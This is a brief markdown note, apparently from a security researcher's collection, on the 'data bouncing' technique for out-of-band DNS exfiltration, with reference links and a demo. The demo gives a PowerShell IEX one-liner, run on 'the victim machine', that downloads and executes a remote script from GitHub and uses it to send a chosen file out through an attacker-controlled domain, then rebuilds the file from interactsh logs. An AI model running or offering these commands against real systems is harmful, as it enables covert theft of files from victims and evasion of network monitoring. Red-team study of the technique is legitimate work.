# Links

- [https://github.com/Unit-259/dataBouncing](https://github.com/Unit-259/dataBouncing)
- [https://github.com/N1ckDunn/DataBouncing](https://github.com/N1ckDunn/DataBouncing)
- [https://github.com/N1ckDunn/Interocitor](https://github.com/N1ckDunn/Interocitor)
- [https://thecontractor.io/data-bouncing/](https://thecontractor.io/data-bouncing/)
- [https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)
- [https://app.interactsh.com/#/](https://app.interactsh.com/#/)
- [https://pinggy.io/](https://pinggy.io/)

## Demo

- Run [https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh):

```bash
./interactsh-client -o logs.txt
```

- To exfiltrate data from the victim machine, first run [https://github.com/Unit-259/dataBouncing/blob/main/nightCrawler.ps1](https://github.com/Unit-259/dataBouncing/blob/main/nightCrawler.ps1):

```powershell
IEX (New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/Unit-259/dataBouncing/refs/heads/main/nightCrawler.ps1")
Invoke-NightCrawler -Identifier "LifeIsSad" -Domain "YourDNSControlledDomainForOOBExfiltrattion" -Urls "urlscan.io" -FilePath "PathOfFileToExfiltrate" -EncryptionEnabled -EncryptionKey "SadIsLife"
```

- To reconstruct the exfiltrated file, run [https://github.com/Unit-259/dataBouncing/blob/main/deadPool.ps1](https://github.com/Unit-259/dataBouncing/blob/main/deadPool.ps1):

```powershell
Invoke-DeadPool -LogFile "logs.txt" -Identifier "LifeIsSad" -EncryptionEnabled -EncryptionKey "SadIsLife" -OutputFile "PathToFileWhereToSaveExfiltrated"
```